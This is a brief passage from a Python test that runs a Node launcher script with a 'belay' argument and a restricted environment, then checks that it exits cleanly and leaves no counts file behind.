    done = subprocess.run([node, str(root / "bin" / LAUNCHER.name), str(config), "belay"],
                          input="{}", env={"PATH": os.environ.get("PATH", "")},
                          capture_output=True, text=True, timeout=60)
    assert done.returncode == 0
    assert not counts.exists()
